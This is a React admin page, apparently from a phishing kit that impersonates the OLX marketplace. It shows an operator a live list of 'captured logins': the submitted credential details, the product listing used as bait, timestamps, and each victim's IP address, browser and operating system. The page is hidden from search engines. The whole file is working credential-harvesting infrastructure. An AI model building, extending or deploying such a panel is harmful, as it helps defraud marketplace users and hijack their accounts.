import { createFileRoute } from "@tanstack/react-router";
import { useEffect } from "react";
import { LogIn, Trash2, Globe, Monitor, Shield, Loader2 } from "lucide-react";
import { format } from "date-fns";
import { ptBR } from "date-fns/locale";
import { toast } from "sonner";
import { useActivities, useAuth } from "@/hooks/admin";
import { supabase } from "@/integrations/supabase/client";
import { Button } from "@/components/ui/button";

export const Route = createFileRoute("/painel/logins")({
  head: () => ({
    meta: [
      { title: "Registro de Logins - OLX" },
      { name: "robots", content: "noindex, nofollow" },
    ],
  }),
  component: LoginsPage,
});

function LoginsPage() {
  const { user } = useAuth();
  const { activities, loading, deleteActivity, refetch } = useActivities();

  useEffect(() => {
    if (!user) return;
    const ch = supabase
      .channel("logins-realtime")
      .on(
        "postgres_changes",
        { event: "*", schema: "public", table: "activities", filter: `user_id=eq.${user.id}` },
        () => refetch(),
      )
      .subscribe();
    return () => {
      supabase.removeChannel(ch);
    };
  }, [user, refetch]);

  const logins = activities.filter((a) => a.type === "login_submit");

  return (
    <div className="bg-white rounded-3xl border border-slate-200/60 p-4 lg:p-6 shadow-sm">
      <div className="flex items-center justify-between mb-6">
        <div>
          <h2 className="text-lg font-bold text-slate-800">Registro de Logins</h2>
          <p className="text-sm text-slate-500 mt-0.5">
            {logins.length} {logins.length === 1 ? "login capturado" : "logins capturados"}
          </p>
        </div>
      </div>

      {loading ? (
        <div className="flex items-center justify-center py-12">
          <Loader2 className="h-6 w-6 animate-spin text-muted-foreground" />
        </div>
      ) : logins.length === 0 ? (
        <div className="text-center py-12 text-slate-400">
          <div className="inline-flex items-center justify-center w-16 h-16 rounded-full bg-slate-100 mb-4">
            <LogIn className="h-8 w-8 text-slate-300" />
          </div>
          <p className="font-medium">Nenhum login registrado ainda</p>
        </div>
      ) : (
        <div className="space-y-3 max-h-[70vh] overflow-y-auto pr-1">
          {logins.map((a) => (
            <div key={a.id} className="p-4 rounded-2xl border bg-blue-50 border-blue-200">
              <div className="flex justify-between gap-3">
                <div className="flex items-start gap-3 flex-1 min-w-0">
                  <div className="p-2.5 rounded-xl bg-blue-600 text-white flex-shrink-0">
                    <LogIn className="h-4 w-4" />
                  </div>
                  <div className="min-w-0 flex-1">
                    <p className="text-sm font-semibold text-blue-800">Login enviado</p>
                    {a.product_name && (
                      <p className="text-xs text-slate-600 mt-1 font-medium truncate">📦 {a.product_name}</p>
                    )}
                    {a.details && (
                      <p className="text-xs text-slate-800 mt-1 whitespace-pre-wrap break-words bg-white/70 border border-slate-200 rounded-md px-2 py-1 font-mono">
                        {a.details}
                      </p>
                    )}
                    <p className="text-xs text-slate-500 mt-1.5">
                      🕐 {format(new Date(a.created_at), "dd/MM/yyyy 'às' HH:mm:ss", { locale: ptBR })}
                    </p>
                    <div className="mt-3 flex flex-wrap gap-1.5">
                      {a.ip && (
                        <span className="inline-flex items-center gap-1 px-2 py-1 rounded-full text-xs font-medium bg-white text-slate-600 border border-slate-200">
                          <Globe className="h-3 w-3" />{a.ip}
                        </span>
                      )}
                      {a.browser && (
                        <span className="inline-flex items-center gap-1 px-2 py-1 rounded-full text-xs font-medium bg-white text-slate-600 border border-slate-200">
                          <Monitor className="h-3 w-3" />{a.browser}
                        </span>
                      )}
                      {a.os && (
                        <span className="inline-flex items-center gap-1 px-2 py-1 rounded-full text-xs font-medium bg-white text-slate-600 border border-slate-200">
                          <Shield className="h-3 w-3" />{a.os}
                        </span>
                      )}
                    </div>
                  </div>
                </div>
                <Button
                  variant="ghost"
                  size="sm"
                  onClick={() => {
                    if (deleteActivity(a.id)) toast.success("Login removido");
                  }}
                  className="text-slate-400 hover:text-red-600 hover:bg-red-50 rounded-full h-8 w-8 p-0"
                >
                  <Trash2 className="h-4 w-4" />
                </Button>
              </div>
            </div>
          ))}
        </div>
      )}
    </div>
  );
}
